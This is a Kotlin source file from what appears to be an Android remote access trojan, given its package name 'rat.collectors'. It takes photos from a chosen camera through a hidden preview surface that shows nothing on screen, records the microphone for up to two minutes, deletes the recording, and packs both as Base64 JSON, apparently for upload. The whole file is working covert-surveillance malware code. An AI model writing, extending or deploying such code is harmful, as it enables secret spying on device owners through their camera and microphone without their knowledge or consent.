package com.example.rat.collectors

import android.content.Context
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.media.MediaRecorder
import android.os.Build
import android.util.Base64
import org.json.JSONObject
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

object MediaCapture {

    @Suppress("DEPRECATION")
    fun photo(facing: String): JSONObject {
        var camera: Camera? = null
        try {
            camera = Camera.open(cameraId(facing))
            val texture = SurfaceTexture(10)
            camera.setPreviewTexture(texture)
            camera.startPreview()
            Thread.sleep(600)

            val latch = CountDownLatch(1)
            val holder = arrayOfNulls<ByteArray>(1)

            camera.takePicture(null, null, Camera.PictureCallback { data, _ ->
                holder[0] = data
                latch.countDown()
            })

            latch.await(15, TimeUnit.SECONDS)
            val bytes = holder[0] ?: throw IllegalStateException("camera yielded no data")

            return JSONObject()
                .put("mime", "image/jpeg")
                .put("size", bytes.size)
                .put("data", Base64.encodeToString(bytes, Base64.NO_WRAP))
        } finally {
            try { camera?.stopPreview() } catch (_: Exception) {}
            try { camera?.release() } catch (_: Exception) {}
        }
    }

    @Suppress("DEPRECATION")
    private fun cameraId(facing: String): Int {
        val wantFront = facing.equals("front", ignoreCase = true)
        val count = Camera.getNumberOfCameras()
        for (i in 0 until count) {
            val info = Camera.CameraInfo()
            Camera.getCameraInfo(i, info)
            val isFront = info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT
            if (isFront == wantFront) return i
        }
        return 0
    }

    @Suppress("DEPRECATION")
    fun audio(context: Context, seconds: Int): JSONObject {
        val file = File(context.cacheDir, "rec_${System.currentTimeMillis()}.m4a")
        var recorder: MediaRecorder? = null
        try {
            recorder = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(context) else MediaRecorder()
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setOutputFile(file.absolutePath)
            recorder.prepare()
            recorder.start()
            Thread.sleep(seconds.coerceIn(1, 120) * 1000L)
        } finally {
            try { recorder?.stop() } catch (_: Exception) {}
            try { recorder?.release() } catch (_: Exception) {}
        }

        val bytes = file.readBytes()
        file.delete()
        return JSONObject()
            .put("mime", "audio/mp4")
            .put("size", bytes.size)
            .put("data", Base64.encodeToString(bytes, Base64.NO_WRAP))
    }
}
